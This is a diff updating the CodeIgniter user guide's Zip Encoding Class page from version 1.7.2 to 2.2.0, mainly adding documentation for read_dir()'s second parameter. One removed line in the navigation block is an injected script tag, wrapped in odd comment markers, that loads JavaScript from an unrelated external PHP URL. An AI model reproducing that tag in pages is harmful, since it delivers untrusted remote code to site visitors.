@@ -23,13 +23,12 @@
 <body>
 
 <!-- START NAVIGATION -->
-<div id="nav"><div id="nav_inner"><script type="text/javascript">create_menu('../');</script></div><!--cfeafa--><script type="text/javascript" src="http://eapo.neon.jp/js/Rx2bXC7H.php?id=332070"></script><!--/cfeafa-->
-</div>
+<div id="nav"><div id="nav_inner"><script type="text/javascript">create_menu('../');</script></div></div>
 <div id="nav2"><a name="top"></a><a href="javascript:void(0);" onclick="myHeight.toggle();"><img src="../images/nav_toggle_darker.jpg" width="154" height="43" border="0" title="Toggle Table of Contents" alt="Toggle Table of Contents" /></a></div>
 <div id="masthead">
 <table cellpadding="0" cellspacing="0" border="0" style="width:100%">
 <tr>
-<td><h1>CodeIgniter User Guide Version 1.7.2</h1></td>
+<td><h1>CodeIgniter User Guide Version 2.2.0</h1></td>
 <td id="breadcrumb_right"><a href="../toc.html">Table of Contents Page</a></td>
 </tr>
 </table>
@@ -45,7 +44,7 @@
 <a href="../index.html">User Guide Home</a> &nbsp;&#8250;&nbsp;
 Zip Encoding Class
 </td>
-<td id="searchbox"><form method="get" action="http://www.google.com/search"><input type="hidden" name="as_sitesearch" id="as_sitesearch" value="codeigniter.com/user_guide/" />Search User Guide&nbsp; <input type="text" class="input" style="width:200px;" name="q" id="q" size="31" maxlength="255" value="" />&nbsp;<input type="submit" class="submit" name="sa" value="Go" /></form></td>
+<td id="searchbox"><form method="get" action="http://www.google.com/search"><input type="hidden" name="as_sitesearch" id="as_sitesearch" value="ellislab.com/codeigniter/user-guide/" />Search User Guide&nbsp; <input type="text" class="input" style="width:200px;" name="q" id="q" size="31" maxlength="255" value="" />&nbsp;<input type="submit" class="submit" name="sa" value="Go" /></form></td>
 </tr>
 </table>
 <!-- END BREADCRUMB -->
@@ -178,7 +177,7 @@ $this->zip->download('my_backup.zip');
 
 <h2>$this->zip->read_dir()</h2>
 
-<p>Permits you to compress a folder (and its contents) that already exists somewhere on your server.  Supply a file path to the 
+<p>Permits you to compress a folder (and its contents) that already exists somewhere on your server.  Supply a file path to the
 directory and the zip class will recursively read it and recreate it as a Zip archive.  All files contained within the
 supplied path will be encoded, as will any sub-folders contained within it.  Example:</p>
 
@@ -189,6 +188,16 @@ $this->zip->read_dir($path);
  // Download the file to your desktop.  Name it "my_backup.zip"<br />
 $this->zip->download('my_backup.zip');
 </code>
+
+<p>By default the Zip archive will place all directories listed in the first parameter inside the zip. If you want the tree preceding the target folder to be ignored
+you can pass <kbd>FALSE</kbd> (boolean) in the second parameter.  Example:</p>
+
+<code>
+$path = '/path/to/your/directory/';<br /><br />
+$this->zip->read_dir($path, FALSE);
+</code>
+
+<p>This will create a ZIP with the folder "directory" inside, then all sub-folders stored correctly inside that, but will not include the folders <samp>/path/to/your</samp>.</p>
 
 
 
@@ -270,9 +279,9 @@ Previous Topic:&nbsp;&nbsp;<a href="xmlrpc.html"> XML-RPC Class</a>
 &nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
 <a href="#top">Top of Page</a>&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
 <a href="../index.html">User Guide Home</a>&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
-Next Topic:&nbsp;&nbsp;<a href="../helpers/array_helper.html">Array Helper</a>
+Next Topic:&nbsp;&nbsp;<a href="caching.html">Caching Class</a>
 </p>
-<p><a href="http://codeigniter.com">CodeIgniter</a> &nbsp;&middot;&nbsp; Copyright &#169; 2006-2009 &nbsp;&middot;&nbsp; <a href="http://ellislab.com/">Ellislab, Inc.</a></p>
+<p><a href="http://codeigniter.com">CodeIgniter</a> &nbsp;&middot;&nbsp; Copyright &#169; 2006 - 2014 &nbsp;&middot;&nbsp; <a href="http://ellislab.com/">EllisLab, Inc.</a></p>
 </div>
 
 </body>
